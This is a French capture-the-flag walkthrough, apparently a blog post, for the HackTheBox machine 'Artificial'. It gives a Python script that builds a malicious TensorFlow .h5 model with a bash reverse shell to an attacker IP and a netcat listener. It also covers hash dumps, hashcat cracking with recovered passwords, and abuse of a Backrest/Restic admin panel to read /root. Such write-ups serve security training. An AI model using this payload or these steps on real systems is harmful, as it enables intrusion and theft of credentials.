---
title: Artificial
date: "2025-07-05"
tags:
  [
    "Port Enumeration",
    "Malicious File Upload",
    "backup-file-exposure",
    "credential-cracking",
  ]
draft: false
summary: "Ce guide d√©taille pas √† pas la r√©solution de la machine HTB Artificial, en exploitant un upload de fichier malveillant pour obtenir un acc√®s utilisateur, une exploration de ports locaux, une analyse de fichiers de sauvegarde pour r√©cup√©rer un mot de passe bcrypt, et une escalade de privil√®ges via une interface admin."
images: ["/static/images/artificial/logo.webp"]
---

# üß† Types de vuln√©rabilit√©s exploit√©es

1. **Malicious File Upload** : Upload d‚Äôun mod√®le TensorFlow malveillant (`.h5`) contenant un reverse shell.
2. **Backup File Exposure** : Exposition d‚Äôune archive de sauvegarde contenant un mot de passe bcrypt.

# üß≠ M√©thodologie √©tape par √©tape

## üîç 1. Scan initial & reconnaissance

### √âtape 1.1 : Scan des ports avec Nmap

- Objectif : Identifier les services accessibles.
- Commande ex√©cut√©e :

```
$ nmap -sC -sV 10.10.11.74
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 19:33 CEST
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- R√©sultat : Ports ouverts :
  - **22/tcp (SSH)** : OpenSSH 8.2p1 (Ubuntu).
  - **80/tcp (HTTP)** : Nginx 1.18.0, titre "Artificial - AI Solutions".

### √âtape 1.2 : Analyse web avec WhatWeb

- Objectif : Identifier les technologies web.
- Commande ex√©cut√©e :

```
$ whatweb http://10.10.11.74
http://10.10.11.74 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.74], RedirectLocation[http://artificial.htb/], Title[302 Found], nginx[1.18.0]
http://artificial.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Script, Title[Artificial - AI Solutions], nginx[1.18.0]
```

- R√©sultat : Redirection vers `http://artificial.htb/`, site HTML5 sous Nginx 1.18.0.

### √âtape 1.3 : Fuzzing des r√©pertoires (tentative √©chou√©e)

- Objectif : Trouver des r√©pertoires ou fichiers cach√©s.
- Commande ex√©cut√©e :

```
$ dirsearch -u http://10.10.11.74 -x 404,500
```

- R√©sultat : Aucun r√©pertoire ou fichier notable trouv√©. Cette tentative n‚Äôa rien r√©v√©l√©, mais il est crucial de tester les chemins sensibles.

## üí• 2. Acc√®s utilisateur via fichier malveillant

### √âtape 2.1 : Analyse de l‚Äôinterface web

- Acc√®s √† `http://artificial.htb/` : Interface web permettant d‚Äôuploader un mod√®le AI (fichier `.h5`).
- Observation : Le serveur charge le mod√®le `.h5` dans un environnement Docker, permettant l‚Äôinjection de code malveillant via un fichier TensorFlow.

### √âtape 2.2 : Cr√©ation d‚Äôun mod√®le malveillant

- Objectif : G√©n√©rer un fichier `.h5` contenant un reverse shell.
  - Le script `shell.py` cr√©e un mod√®le TensorFlow (`malicious_model.h5`) avec une couche Lambda ex√©cutant un reverse shell.
  - Le fichier `.h5` est upload√© sur l‚Äôinterface web.
  - Le serveur utilise un conteneur Docker pour charger et ex√©cuter le mod√®le, ce qui d√©clenche le reverse shell.
  - Docker est ex√©cut√© localement pour pr√©parer et tester l‚Äôenvironnement (TensorFlow, Python 3.8) n√©cessaire √† la cr√©ation de `malicious_model.h5`, simulant l‚Äôenvironnement du serveur cible avant l‚Äôupload.

  ### √âtape 2.3 : Configuration de Docker sur Kali

- Objectif : Configurer un environnement local pour g√©n√©rer et tester `malicious_model.h5`.
- Pourquoi Docker localement ?
  - `shell.py` n√©cessite TensorFlow, qui peut √™tre difficile √† installer directement sur Kali.
  - Docker permet de cr√©er un environnement (Python 3.8, TensorFlow) similaire √† celui du serveur cible.
  - Tester localement dans un conteneur Docker valide que le fichier `.h5` fonctionne avant l‚Äôupload.
- Commandes ex√©cut√©es :

```
curl -fsSL https://download.docker.com/linux/static/stable/x86_64/docker-26.1.3.tgz -o docker.tgz
tar xzvf docker.tgz
sudo cp docker/* /usr/bin/
sudo dockerd & # Lance le daemon Docker
```

- Script `shell.py` ex√©cut√© sur Kali :

```python
import tensorflow as tf
import os

def malicious_code(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'")
    return x

model = tf.keras.Sequential([
    tf.keras.layers.Lambda(malicious_code, input_shape=(1,))
])

model.save("malicious_model.h5")
```

- R√©sultat : G√©n√®re `malicious_model.h5`, qui ex√©cute un reverse shell lors de son chargement par l‚Äôapplication dans un conteneur Docker.

### √âtape 2.4 : Pr√©paration du reverse shell

- Configurer l‚Äô√©coute sur Kali :

```
nc -lvnp 4444
```

### √âtape 2.5 : Upload et ex√©cution

- Uploader `malicious_model.h5` via l‚Äôinterface web.
- R√©sultat : Le serveur charge le mod√®le dans un conteneur Docker, ex√©cutant le reverse shell. Connexion obtenue en tant qu‚Äôutilisateur `app`.

```
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.74] 52804
app@artificial:~/app$ ls
app.py  instance  models  __pycache__  static  templates
```

## üîê 3. Acc√®s utilisateur `gael`

### √âtape 3.1 : Exploration du r√©pertoire

- V√©rification des fichiers dans `/home/app` :

```
app@artificial:~/app$ ls
app.py  instance  models  __pycache__  static  templates
```

### √âtape 3.2 : Analyse de la base SQLite

- Acc√®s au r√©pertoire `instance` :

```
app@artificial:~/app$ cd instance/
app@artificial:~/app/instance$ ls
users.db
```

- Exploration de la base SQLite :

```
app@artificial:~/app$ sqlite3 instance/users.db
.tables
model  user
select * from user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|testuser|test@test.com|e16b2ab8d12314bf4efbd6203906ea6c
7|{{7*7}}|ssti@test.com|e16b2ab8d12314bf4efbd6203906ea6c
8|jean|jean@jean.com|b71985397688d6f1820685dde534981b
9|test|test@gmail.com|098f6bcd4621d373cade4e832627b4f6
10|zeri0n|p.den.boer@betabit.nl|5f4dcc3b5aa765d61d8327deb882cf99
11|hacker123|hacker123@test.com|482c811da5d5b4bc6d497ffa98491e38
12|test123|test123@test.com|cc03e747a6afbbcbf8be7668acfebee5
```

- Hashes MD5 connus :
  - `098f6bcd4621d373cade4e832627b4f6` (test) ‚Üí `test`
  - `5f4dcc3b5aa765d61d8327deb882cf99` (zeri0n) ‚Üí `password`
  - `482c811da5d5b4bc6d497ffa98491e38` (hacker123) ‚Üí `password123`
  - `cc03e747a6afbbcbf8be7668acfebee5` (test123) ‚Üí `test123`

### √âtape 3.3 : Craquage du mot de passe de `gael`

- Hash MD5 de `gael` : `c99175974b6e192936d97224638a34f8`.
- Sauvegarde du hash :

```
echo "c99175974b6e192936d97224638a34f8" > hash.txt
```

- Craquage avec `hashcat` :

```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

- R√©sultat : Mot de passe `mattp005numbertwo`.

### √âtape 3.4 : Connexion en tant que `gael`

- Tentative √©chou√©e : V√©rification des privil√®ges `sudo` :

```
app@artificial:~/app/instance$ su - gael
Password: mattp005numbertwo
gael@artificial:~$ sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```

- Solution : Cr√©er un pseudo-terminal :

```
gael@artificial:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
gael@artificial:~$ sudo -l
[sudo] password for gael: mattp005numbertwo
Sorry, user gael may not run sudo on artificial.
```

- Le√ßon : Les commandes comme `sudo` n√©cessitent un terminal interactif. Utiliser `pty.spawn` r√©sout ce probl√®me.

- Connexion SSH r√©ussie :

```
ssh gael@10.10.11.74
Password: mattp005numbertwo
```

- ‚úÖ R√©cup√©ration du flag `user.txt` :

```
gael@artificial:~$ ls
user.txt
gael@artificial:~$ cat user.txt
```

## üïµÔ∏è‚Äç‚ôÇÔ∏è 4. Exploration des ports locaux

### √âtape 4.1 : Enum√©ration des ports locaux

- Objectif : Identifier les services internes.
- Commande ex√©cut√©e :

```
gael@artificial:~$ netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        4      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

- R√©sultat : Ports ouverts localement :
  - **22/tcp** : SSH (accessible publiquement, OpenSSH 8.2p1).
  - **80/tcp, 80/tcp6** : HTTP (Nginx 1.18.0, accessible publiquement).
  - **53/tcp, 53/udp** : DNS (127.0.0.53, service interne, probablement systemd-resolved).
  - **5000/tcp** : Service inconnu (127.0.0.1, probablement Flask ou autre application web interne).
  - **9898/tcp** : Service inconnu (127.0.0.1, cl√© pour l‚Äôescalade).

### √âtape 4.2 : Tests √©chou√©s sur le port 9898

- Tentatives de connexion directe :

```
gael@artificial:~$ nc 127.0.0.1 9898
whoami
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close
400 Bad Request

gael@artificial:~$ nc 127.0.0.1 9898
GET
HTTP/1.1 400 Bad Request

gael@artificial:~$ nc 127.0.0.1 9898
HELP
HTTP/1.1 400 Bad Request
```

- V√©rification des processus (√©choue) :

```
gael@artificial:~$ lsof -i :9898
gael@artificial:~$ ps aux | grep 9898
gael        4264  0.0  0.0   6300   720 pts/1    S+   19:07   0:00 grep --color=auto 9898
```

- Le√ßon : Les requ√™tes HTTP mal form√©es ou non authentifi√©es √©chouent. V√©rifier les services associ√©s et les fichiers de configuration.

### √âtape 4.3 : R√©cup√©ration de donn√©es via `curl`

- Commande ex√©cut√©e :

```
gael@artificial:~$ curl -s http://127.0.0.1:9898/ --output response.bin
gael@artificial:~$ file response.bin
response.bin: gzip compressed data, was "index.html", last modified: Sun Feb 16 19:35:07 2025, from Unix, original size modulo 2^32 315
```

- Pourquoi `.bin` puis `.gz` ?
  - **Sortie dans `.bin`** : La r√©ponse initiale de `curl` est enregistr√©e dans `response.bin` car le contenu est binaire (non lisible directement). L‚Äôextension `.bin` est utilis√©e par convention pour indiquer un fichier binaire brut, sans pr√©sumer de son format.
  - **Renommage en `.gz`** : La commande `file response.bin` identifie le fichier comme √©tant compress√© en gzip. Renommer en `response.gz` permet d‚Äôutiliser l‚Äôoutil `gunzip` pour d√©compresser, car `gunzip` attend une extension `.gz` ou un fichier gzip valide.

- D√©compression :

```
gael@artificial:~$ mv response.bin response.gz
gael@artificial:~$ gunzip response.gz
gael@artificial:~$ cat response
<!DOCTYPE html><html><head><link rel="stylesheet" href="index.849c998d.css"><title>Backrest</title><link rel="stylesheet" href="index.27ca007c.css"><link rel="icon" type="image/png" href="favicon.d479cd22.png"></head><body> <div id="app"></div> <script src="index.236f0f7c.js" type="module"></script> </body></html>
```

### √âtape 4.4 : Analyse des fichiers r√©f√©renc√©s

- R√©cup√©ration des fichiers CSS, favicon, et JavaScript :

```
gael@artificial:~$ curl -s http://127.0.0.1:9898/index.849c998d.css --output css1.css
gael@artificial:~$ curl -s http://127.0.0.1:9898/index.27ca007c.css --output css2.css
gael@artificial:~$ curl -s http://127.0.0.1:9898/favicon.d479cd22.png --output favicon.png
gael@artificial:~$ curl -s http://127.0.0.1:9898/index.236f0f7c.js --output script.js
gael@artificial:~$ ls
css1.css  css2.css  favicon.png  script.js  user.txt
```

- D√©compression et analyse :

```
gael@artificial:~$ mv css1.css css1.gz && gunzip css1.gz && cat css1
.react-js-cron{flex-wrap:wrap;align-items:flex-start;display:flex}...
gael@artificial:~$ mv css2.css css2.gz && gunzip css2.gz && cat css2
body{margin:0}.backrest.operation-details,.backrest.file-details...
gael@artificial:~$ mv favicon.png favicon.gz && gunzip favicon.gz && file favicon
favicon: PNG image data, 650 x 650, 8-bit gray+alpha, non-interlaced
gael@artificial:~$ mv script.js script.gz && gunzip script.gz && strings script | grep -E "api|key|password|root|admin"
```

- R√©sultat : Aucune information sensible dans les fichiers (CSS pour interface, favicon PNG, script JavaScript sans r√©f√©rences exploitables).

## üìÅ 5. Backup File Exposure

### √âtape 5.1 : D√©couverte de l‚Äôarchive de sauvegarde

- **Objectif de l‚Äôexploration** : Lors de l‚Äôexploration d‚Äôun serveur, l‚Äôobjectif est de trouver des fichiers ou r√©pertoires contenant des informations sensibles (cr√©dentials, configurations, sauvegardes) qui peuvent √™tre exploit√©s pour escalader les privil√®ges ou obtenir un acc√®s suppl√©mentaire. Les r√©pertoires int√©ressants incluent :
  - `/var/backups/` : Souvent utilis√© pour stocker des sauvegardes syst√®me ou applicatives (ex. `.tar.gz`, `.bak`).
  - `/etc/` : Contient des fichiers de configuration syst√®me (ex. `/etc/passwd`, `/etc/shadow` si accessibles).
  - `/home/` : R√©pertoires des utilisateurs, pouvant contenir des fichiers de configuration ou des cl√©s SSH.
  - `/tmp/` : Fichiers temporaires qui peuvent √™tre lisibles/√©crivables.
  - `/var/log/` : Journaux pouvant r√©v√©ler des informations sur les services ou erreurs.
  - `/var/www/` : Fichiers web, configurations d‚Äôapplications ou bases de donn√©es.
  - `~/.config/` : Configurations utilisateur sp√©cifiques √† des applications.
- Commande ex√©cut√©e pour explorer :

```
gael@artificial:~$ find / -type d -name "*backup*" 2>/dev/null
/var/backups
gael@artificial:~$ cd /var/backups/
gael@artificial:/var/backups$ ls
apt.extended_states.0  apt.extended_states.1.gz  ...  backrest_backup.tar.gz
```

- **Pourquoi `/var/backups/` ?** : Ce r√©pertoire est un emplacement standard pour les sauvegardes sur les syst√®mes Linux. Les fichiers comme `backrest_backup.tar.gz` peuvent contenir des configurations ou des credentials critiques, souvent mal prot√©g√©s.
- Extraction de l‚Äôarchive :

```
gael@artificial:/var/backups$ tar xvf /var/backups/backrest_backup.tar.gz -C /tmp/
backrest/.config/backrest/config.json
...
```

- R√©sultat : L‚Äôarchive contient un fichier `config.json` dans `backrest/.config/backrest/`, potentiellement sensible.

### √âtape 5.2 : Analyse du fichier `config.json`

- **Analyse d√©taill√©e** : Le fichier `/tmp/backrest/.config/backrest/config.json` est examin√© pour identifier des informations exploitables, telles que des identifiants, cl√©s API, ou configurations li√©es au service Backrest (li√© au port 9898).
- Contenu du fichier :

```
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

- **Observations** :
  - Le fichier contient une section `auth` avec un utilisateur `backrest_root` et un hash bcrypt (`passwordBcrypt`).
  - Le champ `disabled: false` indique que l‚Äôauthentification est active, sugg√©rant que ce credential est utilis√© pour acc√©der √† une interface ou un service (probablement Backrest sur le port 9898).
  - Le hash bcrypt est encod√© en base64, ce qui est courant pour stocker des donn√©es binaires dans des fichiers JSON textuels.

### √âtape 5.3 : D√©codage du hash bcrypt

- Hash encod√© en base64 : `JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP`.
- **Pourquoi d√©coder le base64 ?** :
  - Le hash bcrypt est stock√© en base64 dans le JSON pour permettre son inclusion dans un format texte (JSON ne supporte pas les donn√©es binaires brutes).
  - Le d√©codage en base64 est n√©cessaire pour obtenir le hash bcrypt brut (format `$2a$10$...`) compatible avec des outils de craquage comme `hashcat`.
- D√©codage :

```
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
$2a$10$cWGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSspbRutYP58EBZj/0QO
```

### √âtape 5.4 : Craquage du hash bcrypt

- Sauvegarde du hash :

```
echo '$2a$10$cWGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSspbRutYP58EBZj/0QO' > hash.txt
```

- Craquage avec `hashcat` :

```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

- R√©sultat : Mot de passe `!@#$%^`.

## üöÄ 6. Escalade de privil√®ges

### √âtape 6.1 : Connexion √† l‚Äôinterface Backrest

- **Fonctionnalit√©s de l‚Äôinterface Backrest** :
  - L‚Äôinterface Backrest, accessible sur `http://127.0.0.1:9898`, est une application web utilisant **Restic**, un outil de sauvegarde open-source, pour g√©rer les sauvegardes syst√®me.
  - Avec les identifiants `backrest_root:!@#$%^`, l‚Äôacc√®s √† la section `/admin` permet d‚Äôinteragir avec des fonctionnalit√©s privil√©gi√©es, notamment la gestion des sauvegardes et l‚Äôex√©cution de commandes syst√®me.
  - L‚Äôinterface offre une fonctionnalit√© d‚Äôex√©cution de commandes Restic, permettant de cr√©er, restaurer, ou inspecter des sauvegardes, ce qui peut √™tre exploit√© pour ex√©cuter des commandes arbitraires avec des privil√®ges √©lev√©s (root).
- Test d‚Äôauthentification :

```
gael@artificial:~$ curl -u backrest_root:!@#$%^ http://127.0.0.1:9898/admin
```

- **Forwarding du port pour acc√®s navigateur :**

```
ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
```

- Acc√®s √† `http://127.0.0.1:9898/admin` sur Kali

![backrest_login](/static/images/artificial/backrest_login.png)

- Login avec `backrest_root:!@#$%^`

### √âtape 6.2 : Exploitation et r√©cup√©ration du flag root

- **Utilisation de Restic dans l‚Äôinterface Backrest** :
  - L‚Äôinterface Backrest utilise Restic pour g√©rer les sauvegardes. Pour acc√©der au contenu du r√©pertoire `/root`, il est n√©cessaire de configurer un r√©pertoire de sauvegarde.
  - Ajout du r√©pertoire `/tmp/flag` comme destination de sauvegarde dans l‚Äôinterface Backrest.

  ![backrest_add](/static/images/artificial/backrest_add.png)
  - Ex√©cution des commandes Restic via l‚Äôinterface :
    1. **Sauvegarde de `/root`** : Lancer une sauvegarde du r√©pertoire `/root` vers `/tmp/flag` avec la commande `backup /root`. Cela cr√©e un snapshot contenant les fichiers de `/root`, y compris `root.txt`.
    2. **R√©cup√©ration du flag** : Ex√©cuter la commande `dump latest /root/root.txt` pour extraire le contenu du fichier `root.txt` depuis le dernier snapshot.

  ![backrest_cmd](/static/images/artificial/backrest_cmd.png)

- ‚úÖ R√©sultat : R√©cup√©ration du flag `root.txt`.

---

# ‚úÖ Checklist r√©utilisable pour d'autres labs similaires

1. üîé Scanner les ports et identifier les services web (Nginx).
2. üì¶ Exploiter les fonctionnalit√©s d‚Äôupload (fichiers `.h5`) pour un reverse shell via un mod√®le TensorFlow malveillant.
3. üîê Analyser les bases SQLite pour des credentials.
4. üïµÔ∏è‚Äç‚ôÇÔ∏è Enum√©rer les ports locaux pour des services internes.
5. üìÅ Rechercher des fichiers de sauvegarde expos√©s (ex. `.tar.gz`) dans des r√©pertoires comme `/var/backups/`.
6. üîë Craquer les mots de passe (MD5, bcrypt) avec `hashcat`, en d√©codant les hashes base64 si n√©cessaire.
7. üöÄ Utiliser les credentials pour acc√©der √† une interface admin (ex. Backrest avec Restic) et exploiter des fonctionnalit√©s comme l‚Äôex√©cution de commandes (ex. `backup` et `dump`) pour escalader les privil√®ges.
